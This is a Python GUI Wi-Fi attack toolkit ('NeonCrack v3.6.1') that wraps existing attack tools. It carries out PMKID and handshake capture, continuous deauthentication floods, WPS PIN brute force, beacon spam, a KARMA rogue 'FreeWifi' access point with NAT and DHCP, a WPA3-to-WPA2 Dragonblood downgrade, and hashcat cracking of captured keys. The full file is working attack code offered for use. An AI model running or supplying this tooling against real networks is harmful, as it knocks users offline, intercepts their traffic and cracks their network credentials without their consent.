#!/usr/bin/env python3
"""
NeonCrack v3.6.1 – full-stack Wi-Fi & network toolkit
created by Null_Lyfe
──────────────────────────────────────────────────────
• All features of v3.6 (Dragonblood WPA3→WPA2, KARMA, nmap panel, stats)
• Scan-tab facelift: “Dwell s” moved left, brand-new “Stop Scan” button

Dependencies (Debian/Kali/Parrot):
  sudo apt install aircrack-ng hcxdumptool hcxtools hashcat reaver bully wash \
                   mdk4 hostapd-mana nmap dnsmasq python3-psutil python3-matplotlib

Dragonblood helper (Hashcat-utils):
  git clone https://github.com/hashcat/hashcat-utils.git
  sudo install -m 755 hashcat-utils/src/dragondown/dragondown.py /usr/local/bin/dragondown
"""

# ── imports ────────────────────────────────────────────────────────────────
import os, subprocess, threading, csv, time, signal, sys, re, collections, shutil
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import psutil
import matplotlib; matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# ── constants / globals ─────────────────────────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT = ("Courier New", 11)
CAP_DIR = "neoncrack_captures"; os.makedirs(CAP_DIR, exist_ok=True)
WHITELIST = set()          # add iface names to limit dropdown (keep empty to show all)

root = Tk(); root.title("NeonCrack v3.6.1"); root.configure(bg=BGC); root.geometry("1080x850")

# Tk variables
iface_var, target_var = StringVar(), StringVar()
scan_time            = IntVar(value=45)
pcap_var, word_var   = StringVar(), StringVar()
hash_input           = StringVar()
mon_iface_var        = StringVar()
nmap_target          = StringVar()
nmap_profile         = StringVar(value="Quick Ping")
nmap_custom          = StringVar()

# runtime handles
attack_proc = None          # current attack Popen
scan_proc   = None          # current airodump Popen
monitor_flag = False        # True while iface in monitor
networks      = []          # list of scanned AP tuples

# bandwidth globals
bw_history = collections.deque(maxlen=60)
bw_thread  = None
bw_stop    = threading.Event()

# ── helper wrappers ─────────────────────────────────────────────────────────
def run(cmd, outfile=None):
    """spawn a detached subprocess (silenced unless outfile given)"""
    return subprocess.Popen(cmd,
        stdout=open(outfile,"wb") if outfile else subprocess.DEVNULL,
        stderr=subprocess.STDOUT, preexec_fn=os.setsid)

def run_logged(cmd, widget, outfile=None):
    """spawn subprocess & live-stream stdout to a Tk text widget (+ tee file)"""
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, universal_newlines=True, bufsize=1,
                            preexec_fn=os.setsid)
    def pump():
        with open(outfile,"a") if outfile else open(os.devnull,"w") as fh:
            for line in proc.stdout:
                widget.insert(END, line); widget.see(END); fh.write(line)
    threading.Thread(target=pump, daemon=True).start()
    return proc

def log(widget, msg): widget.insert(END, msg + "\n"); widget.see(END)

# ── interface / monitor helpers ─────────────────────────────────────────────
def iw_interfaces():
    try:
        lines = subprocess.check_output(["iw","dev"], text=True).splitlines()
        all_if = [l.split()[1] for l in lines if l.strip().startswith("Interface")]
        return [i for i in all_if if not WHITELIST or i in WHITELIST]
    except subprocess.CalledProcessError:
        return []

def refresh_iface_menu():
    menu = iface_menu["menu"]; menu.delete(0,"end")
    for i in iw_interfaces():
        menu.add_command(label=i, command=lambda v=i: iface_var.set(v))

def set_monitor(iface, enable=True):
    """toggle monitor-mode via airmon-ng and update iface_var"""
    global monitor_flag
    if not iface: return
    subprocess.run(["airmon-ng", "start" if enable else "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_var.set(iface + "mon" if enable and not iface.endswith("mon")
                  else iface.replace("mon",""))
    monitor_flag = enable
    refresh_iface_menu()

# ── NAT helper (KARMA) ──────────────────────────────────────────────────────
def enable_nat(uplink, ap_if):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink,"-j","MASQUERADE"])
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap_if,
                    "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"])
    subprocess.run(["iptables","-A","FORWARD","-i",ap_if,"-o",uplink,"-j","ACCEPT"])

def disable_nat():
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["iptables","-F"])
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL)

# ── watchdog ────────────────────────────────────────────────────────────────
def watchdog():
    global attack_proc
    while True:
        time.sleep(600)
        if attack_proc and attack_proc.poll() is not None:
            try: os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
            except Exception: pass
            attack_proc = None
threading.Thread(target=watchdog, daemon=True).start()

# ── bandwidth monitor helpers ───────────────────────────────────────────────
def update_bw_plot():
    if not bw_history: return
    up=[u for u,_ in bw_history]; dn=[d for _,d in bw_history]
    xs=list(range(-len(up)+1,1))
    ln_up.set_data(xs, up); ln_dn.set_data(xs, dn)
    ax.set_xlim(min(xs), 0); ax.set_ylim(0, max(max(up+dn),1)*1.2)
    canvas.draw_idle()

def poll_bw(iface):
    try:
        prev = psutil.net_io_counters(pernic=True)[iface]
    except KeyError:
        log(stats_out, f"[!] iface {iface} not found → monitor stopped")
        bw_stop.set(); return
    bw_history.append((0,0)); update_bw_plot()
    while not bw_stop.is_set():
        time.sleep(1)
        try:
            now = psutil.net_io_counters(pernic=True)[iface]
        except KeyError:
            log(stats_out, "[!] iface disappeared; stopping monitor")
            bw_stop.set(); break
        up = (now.bytes_sent - prev.bytes_sent)/125000
        dn = (now.bytes_recv - prev.bytes_recv)/125000
        bw_history.append((up,dn)); prev=now; update_bw_plot()

def start_bw_monitor():
    iface = mon_iface_var.get().strip()
    if not iface:
        messagebox.showinfo("Iface","Enter interface"); return
    if iface not in psutil.net_io_counters(pernic=True):
        messagebox.showerror("Bad iface", f"{iface} not present"); return
    stop_bw_monitor()
    bw_history.clear(); bw_stop.clear()
    global bw_thread
    bw_thread = threading.Thread(target=poll_bw, args=(iface,), daemon=True)
    bw_thread.start()
    log(stats_out, f"[*] Monitoring {iface} …")

def stop_bw_monitor():
    bw_stop.set()
    log(stats_out, "[*] Monitor stopped")

# ── scan helpers ────────────────────────────────────────────────────────────
def parse_csv(path):
    nets=[]
    with open(path,newline='') as f:
        for r in csv.reader(f):
            if len(r)>13 and r[0] and r[0]!="BSSID":
                nets.append((r[0].strip().upper(), r[3].strip(),
                             r[13].strip() or "<hidden>", r[5].strip()))
    return nets

def detect_wps(mon_iface, chans):
    hits=set()
    for ch in sorted(set(chans)):
        try:
            out=subprocess.check_output(
                ["timeout","3","wash","-i",mon_iface,"-c",ch,
                 "--ignore-fcs","-s","-g","--rx-timeout","1"],
                 text=True, stderr=subprocess.DEVNULL)
            hits.update({m.group(1).upper() for m in
                        [re.match(r"([0-9A-Fa-f:]{17})",l) for l in out.splitlines()]
                         if m})
        except subprocess.CalledProcessError:
            pass
    log(scan_out, f"[*] WPS sniff → {len(hits)} flagged")
    return hits

# ── Wi-Fi scan engine ───────────────────────────────────────────────────────
def do_scan(channel_hop=False):
    global scan_proc
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    fn=os.path.join(CAP_DIR,f"scan_{'hop' if channel_hop else 'dwell'}_{datetime.now():%Y%m%d_%H%M%S}")
    cmd=["airodump-ng","-w",fn,"--output-format","csv"]
    if not channel_hop: cmd+=["-c","1,6,11"]
    cmd.append(mon)

    scan_proc = run_logged(cmd, scan_out)
    log(scan_out,"[*] scanning…")
    time.sleep(scan_time.get())
    if scan_proc and scan_proc.poll() is None:
        scan_proc.terminate(); time.sleep(2)

    csvp=fn+"-01.csv"
    scan_proc = None
    if not os.path.isfile(csvp):
        log(scan_out,"[!] CSV missing"); set_monitor(mon,False); return

    base=parse_csv(csvp); wps=detect_wps(mon,[c for _,c,_,_ in base])
    global networks; networks=[]
    scan_out.insert(END,"# |      BSSID       | CH | ENC | WPS | ESSID\n"+"-"*72+"\n")
    for i,(bssid,ch,essid,enc) in enumerate(base,1):
        flag="Y" if bssid in wps else "-"
        networks.append((bssid,ch,essid,enc,flag))
        scan_out.insert(END,f"{i:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")

    target_menu["menu"].delete(0,"end")
    for i,(_,_,essid,_,_) in enumerate(networks,1):
        target_menu["menu"].add_command(label=f"{i} – {essid}",
                                        command=lambda v=str(i): target_var.set(v))
    log(scan_out,f"[+] {len(networks)} nets.")
    set_monitor(mon,False)

def stop_scan():
    global scan_proc
    if scan_proc and scan_proc.poll() is None:
        try: os.killpg(os.getpgid(scan_proc.pid), signal.SIGTERM)
        except Exception: pass
        scan_proc = None
        set_monitor(iface_var.get(), False)
        log(scan_out, "[!] Scan aborted by user")

# ── nmap helper ─────────────────────────────────────────────────────────────
def start_nmap_scan():
    tgt=nmap_target.get().strip()
    if not tgt:
        messagebox.showwarning("Target","Specify host/CIDR"); return
    flags={"Quick Ping":["-sn"],"Top-100 Ports":["-F"],"Full TCP":["-sS","-p-"],
           "OS Detect":["-O","-sS","-F"],"Vuln Script":["--script","vuln"],
           "Custom":nmap_custom.get().split()}
    opts=flags[nmap_profile.get()]
    out=os.path.join(CAP_DIR,f"nmap_{tgt.replace('/','_')}_{int(time.time())}.log")
    log(scan_out,f"[*] nmap {' '.join(opts)} {tgt}")
    run_logged(["nmap",*opts,tgt], scan_out, out)

# ── target picker ───────────────────────────────────────────────────────────
def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target","Pick BSSID"); return None
    return networks[int(target_var.get())-1]

# ── handshake monitor ───────────────────────────────────────────────────────
def handshake_monitor(cap, bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out = subprocess.check_output(
                ["aircrack-ng","-a","2","-w","/dev/null","-b",bssid,cap],
                text=True, stderr=subprocess.DEVNULL, timeout=20)
            if "handshake" in out.lower():
                log(att_out,"[+] Handshake found – stopping")
                os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
                attack_proc=None; set_monitor(iface_var.get(),False); return
        except subprocess.TimeoutExpired:
            pass
        time.sleep(15)

# ── attack routines ─────────────────────────────────────────────────────────
def start_pmkid():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc; attack_proc=run_logged(
        ["hcxdumptool","-i",mon,"--filterlist_ap",bssid,"--enable_status=1"],
        att_out, pcap)
    log(att_out,f"[*] PMKID capture → {pcap}")

def start_handshake():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    prefix=os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc; attack_proc=run_logged(
        ["airodump-ng","-c",ch,"--bssid",bssid,"-w",prefix,mon],
        att_out, prefix+".log")
    run(["aireplay-ng","-0","10","-a",bssid,mon]).wait()
    threading.Thread(target=handshake_monitor,
                     args=(prefix+"-01.cap",bssid),daemon=True).start()

def start_wps():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    tool="reaver" if shutil.which("reaver") else "bully"
    cmd=["reaver","-i",mon,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" \
        else ["bully","-b",bssid,"-c",ch,mon]
    logf=os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logf)
    log(att_out,f"[*] {tool} WPS brute running → {logf}")

def start_deauth():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,_,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    if shutil.which("mdk4"):
        cmd=["mdk4",mon,"d","-B",bssid]; tag="mdk4-deauth"
    else:
        cmd=["aireplay-ng","--deauth","0","-a",bssid,mon]; tag="aireplay-deauth"
    logf=os.path.join(CAP_DIR,f"{tag}_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logf)
    log(att_out,"[*] Deauth flood running – Stop to end")

def start_beacon():
    iface=iface_var.get()
    if not shutil.which("mdk4"):
        messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    ssidfile=os.path.join(CAP_DIR,f"ssid_{int(time.time())}.txt")
    with open(ssidfile,"w") as f:
        for i in range(100): f.write(f"neon-{i:03}\n")
    global attack_proc; attack_proc=run_logged(
        ["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"],
        att_out, ssidfile+".log")
    log(att_out,"[*] Beacon spam – Stop to end")

def start_mass_pmkid():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_sweep_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    global attack_proc; attack_proc=run_logged(
        ["hcxdumptool","-i",mon,"--enable_status=15","-o",pcap],
        att_out, pcap)
    def auto_conv():
        while attack_proc and attack_proc.poll() is None:
            conv=pcap.replace(".pcapng",f"_{int(time.time())}.hccapx")
            run(["hcxpcapngtool","-o",conv,pcap]).wait()
            log(att_out,f"[+] PMKID batch → {conv}")
            time.sleep(300)
    threading.Thread(target=auto_conv,daemon=True).start()
    log(att_out,"[*] Mass PMKID sweep – Stop to end")

def start_karma():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    uplink=simpledialog.askstring("Uplink iface","Outbound NIC (e.g. eth0)",parent=root)
    if not uplink: return
    set_monitor(iface,True); mon=iface_var.get()
    enable_nat(uplink, mon)
    if shutil.which("hostapd-mana"):
        cfg=os.path.join(CAP_DIR,"mana.conf")
        open(cfg,"w").write(
            f"interface={mon}\ndriver=nl80211\nssid=FreeWifi\nhw_mode=g\nchannel=6\n")
        cmd=["hostapd-mana",cfg]; tag="mana"
    else:
        cmd=["airbase-ng","-P","-C","30","-v","FreeWifi",mon]; tag="airbase"
    logf=os.path.join(CAP_DIR,f"{tag}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logf)

    # light dns/DHCP helper
    dns_conf=os.path.join(CAP_DIR,"karma.dnsmasq")
    open(dns_conf,"w").write(f"interface={mon}\ndhcp-range=10.0.0.20,10.0.0.250,12h\n")
    run(["dnsmasq","--conf-file="+dns_conf])

    log(att_out,"[*] KARMA rogue-AP running – Stop to end")

def start_wpa3_downgrade():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,enc,_=t
    if "SAE" not in enc and "WPA3" not in enc:
        messagebox.showinfo("Not WPA3", f"{essid} isn’t SAE."); return
    if shutil.which("dragondown") is None:
        messagebox.showerror("Missing dragondown",
            "Install dragondown.py and put it in $PATH."); return
    set_monitor(iface,True); mon=iface_var.get()
    logf=os.path.join(CAP_DIR,f"dragondown_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(
        ["dragondown","-i",mon,"-b",bssid,"-c",ch], att_out, logf)
    log(att_out,"[*] Dragonblood running – capture PMKID/handshake now")

# ── stop / reset ────────────────────────────────────────────────────────────
def stop_attack():
    disable_nat(); stop_bw_monitor()
    global attack_proc
    if attack_proc:
        try: os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        except Exception: pass
        attack_proc=None
    if monitor_flag: set_monitor(iface_var.get(),False)
    log(att_out,"[!] Attack stopped")

def reset_toolkit(exit_after=False):
    stop_attack(); stop_scan()
    for svc in ("NetworkManager","wpa_supplicant"):
        subprocess.run(["systemctl","restart",svc],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for box in (scan_out,att_out,crack_out,hashid_out,cleaner_out,stats_out):
        box.delete("1.0",END)
    for v in (target_var,pcap_var,word_var,hash_input,
              iface_var,nmap_target,nmap_custom):
        v.set("")
    refresh_iface_menu(); log(scan_out,"[*] Toolkit reset")
    if exit_after: root.quit()

# ── cracking / misc helpers ─────────────────────────────────────────────────
def browse_pcap(): pcap_var.set(filedialog.askopenfilename(
    filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))

def browse_word(): word_var.set(filedialog.askopenfilename(
    filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap, wl = pcap_var.get(), word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing", "Select capture & wordlist"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"], crack_out)
    crack_out.insert(END,"[*] Hashcat launched …\n")

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],
                                           text=True, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")

def hashid_action():
    h=hash_input.get().strip()
    hashid_out.delete("1.0",END)
    if h: hashid_out.insert(END,identify_hash(h)+"\n")

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    stats_out.delete("1.0",END)
    if not os.path.isfile(pot):
        stats_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    stats_out.insert(END,"Len | Count\n--------------\n")
    for l,c in sorted(dist.items()):
        stats_out.insert(END,f"{l:3} | {c}\n")

# ── GUI layout ──────────────────────────────────────────────────────────────
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab", background="#1a1a1a", foreground=NEON,
                padding=8, font=FONT)
nb=ttk.Notebook(root); nb.pack(fill=BOTH, expand=True)
tabs={}
for k,lbl in [("scan","⚡ Scan"),("attack","⚔️ Attacks"),
              ("crack","💥 Crack"),("hash","🔎 Hash ID"),
              ("clean","🧹 Cleaner"),("stats","📊 Stats")]:
    fr=Frame(nb,bg=BGC); nb.add(fr,text=lbl); tabs[k]=fr

# ── Scan tab ────────────────────────────────────────────────────────────────
ts=tabs["scan"]
wifi_row=Frame(ts,bg=BGC); wifi_row.pack(fill=X,pady=4)
iface_menu=OptionMenu(wifi_row, iface_var, *iw_interfaces())
iface_menu.grid(row=0,column=0,padx=4); refresh_iface_menu()
Button(wifi_row,text="EnableMon",bg=ACCENT,fg="white",
       command=lambda:set_monitor(iface_var.get(),True)
).grid(row=0,column=1,padx=2)
Button(wifi_row,text="DisableMon",bg="#ff0030",fg="white",
       command=lambda:set_monitor(iface_var.get(),False)
).grid(row=0,column=2,padx=2)
Label(wifi_row,text="Dwell s",bg=BGC,fg=NEON
).grid(row=0,column=3,sticky="e")
Spinbox(wifi_row,from_=15,to=180,textvariable=scan_time,width=6
).grid(row=0,column=4,sticky="w",padx=(0,6))
Button(wifi_row,text="Focused",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,daemon=True).start()
).grid(row=0,column=5,padx=2)
Button(wifi_row,text="Hop",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,
                                        kwargs={"channel_hop":True},
                                        daemon=True).start()
).grid(row=0,column=6,padx=2)
Button(wifi_row,text="Stop Scan",bg="#ff0030",fg="white",
       command=stop_scan).grid(row=0,column=7,padx=6)

# divider
Frame(ts,height=2,bg=NEON).pack(fill=X,pady=6)

# nmap panel
nmap_box=Frame(ts,bg=BGC); nmap_box.pack(fill=X,pady=2)
Label(nmap_box,text="nmap Target",bg=BGC,fg=NEON
).grid(row=0,column=0,padx=4)
Entry(nmap_box,textvariable=nmap_target,width=18
).grid(row=0,column=1)
OptionMenu(nmap_box,nmap_profile,"Quick Ping","Top-100 Ports","Full TCP",
           "OS Detect","Vuln Script","Custom"
).grid(row=0,column=2,padx=4)
custom_entry=Entry(nmap_box,textvariable=nmap_custom,width=22,state="disabled")
custom_entry.grid(row=0,column=3,padx=4)
def _tgl(*_): custom_entry.config(state="normal" if nmap_profile.get()=="Custom" else "disabled")
nmap_profile.trace_add("write", _tgl)
Button(nmap_box,text="Run nmap",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=start_nmap_scan,daemon=True).start()
).grid(row=0,column=4,padx=4)

scan_out=scrolledtext.ScrolledText(ts,width=115,height=20,bg="#0d0d17",
                                   fg=NEON,font=("Consolas",10))
scan_out.pack(fill=BOTH,expand=True,pady=6,padx=2)

# ── Attack tab ──────────────────────────────────────────────────────────────
ta=tabs["attack"]
target_menu=OptionMenu(ta,target_var,"")
target_menu.pack(fill=X,padx=10,pady=4)

for txt,fn in [
    ("PMKID Capture",   start_pmkid),
    ("4-Way Handshake", start_handshake),
    ("WPS Bruteforce",  start_wps),
    ("Deauth Flood",    start_deauth),
    ("Beacon Spam",     start_beacon),
    ("Mass-PMKID Sweep",start_mass_pmkid),
    ("KARMA Rogue-AP",  start_karma),
    ("WPA3 ➜ WPA2 Downgrade", start_wpa3_downgrade)
]:
    Button(ta,text=txt,bg=ACCENT,fg="white",command=fn
    ).pack(fill=X,padx=20,pady=2)

Button(ta,text="Stop Attack",bg="#ff0030",fg="white",
       command=stop_attack).pack(fill=X,padx=20,pady=4)

att_out=scrolledtext.ScrolledText(ta,width=115,height=18,bg="#0d0d17",
                                  fg=NEON,font=("Consolas",10))
att_out.pack()

# ── Crack tab ───────────────────────────────────────────────────────────────
tc=tabs["crack"]
Entry(tc,textvariable=pcap_var,width=85).pack(pady=2)
Button(tc,text="Browse pcap",command=browse_pcap).pack()
Entry(tc,textvariable=word_var,width=85).pack(pady=2)
Button(tc,text="Browse wordlist",command=browse_word).pack()
Button(tc,text="Start Crack",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=crack,daemon=True).start()
).pack(pady=4)
crack_out=scrolledtext.ScrolledText(tc,width=115,height=18,bg="#0d0d17",
                                    fg=NEON,font=("Consolas",10))
crack_out.pack()

# ── Hash tab ────────────────────────────────────────────────────────────────
th=tabs["hash"]
Entry(th,textvariable=hash_input,width=85).pack(pady=4)
Button(th,text="Identify Hash",bg=ACCENT,fg="white",
       command=hashid_action).pack()
hashid_out=scrolledtext.ScrolledText(th,width=115,height=18,bg="#0d0d17",
                                     fg=NEON,font=("Consolas",10))
hashid_out.pack()

# ── Cleaner tab ─────────────────────────────────────────────────────────────
cl=tabs["clean"]
Button(cl,text="Select & Clean pcapng",bg=ACCENT,fg="white",
       command=clean_capture).pack(pady=4)
cleaner_out=scrolledtext.ScrolledText(cl,width=115,height=20,bg="#0d0d17",
                                      fg=NEON,font=("Consolas",10))
cleaner_out.pack()

# ── Stats tab ───────────────────────────────────────────────────────────────
st=tabs["stats"]
Button(st,text="Refresh Stats",bg=ACCENT,fg="white",
       command=show_stats).pack(pady=4)
stats_out=scrolledtext.ScrolledText(st,width=115,height=12,bg="#0d0d17",
                                    fg=NEON,font=("Consolas",10))
stats_out.pack()
bw_frame=Frame(st,bg=BGC); bw_frame.pack(pady=10,fill=X)
Label(bw_frame,text="Broadband iface:",bg=BGC,fg=NEON
).pack(side=LEFT)
Entry(bw_frame,textvariable=mon_iface_var,width=12
).pack(side=LEFT,padx=4)
Button(bw_frame,text="Start",bg=ACCENT,fg="white",
       command=start_bw_monitor).pack(side=LEFT,padx=4)
Button(bw_frame,text="Stop",bg="#ff0030",fg="white",
       command=stop_bw_monitor).pack(side=LEFT)
fig=Figure(figsize=(5,2.2),dpi=100,facecolor="#0d0d17")
ax=fig.add_subplot(111)
ax.set_title("kbit/s (60 s)",color=NEON,fontsize=9)
ax.tick_params(axis='x',colors="white"); ax.tick_params(axis='y',colors="white")
ln_up,=ax.plot([],[],label="Up",linewidth=1)
ln_dn,=ax.plot([],[],label="Down",linewidth=1)
ax.legend(facecolor="#0d0d17",edgecolor="#0d0d17",labelcolor="white")
canvas=FigureCanvasTkAgg(fig,master=st)
canvas.get_tk_widget().pack(fill=X,padx=10)

# ── Reset tab ───────────────────────────────────────────────────────────────
rt=Frame(nb,bg=BGC); nb.add(rt,text="♻️ Reset")
Button(rt,text="Reset Toolkit",width=26,bg=ACCENT,fg="white",
       command=lambda:reset_toolkit(False)).pack(pady=12)
Button(rt,text="Reset & Exit",width=26,bg="#ff0030",fg="white",
       command=lambda:reset_toolkit(True)).pack()

# ── launch ──────────────────────────────────────────────────────────────────
if __name__=="__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run with sudo."); sys.exit(1)
    root.mainloop()
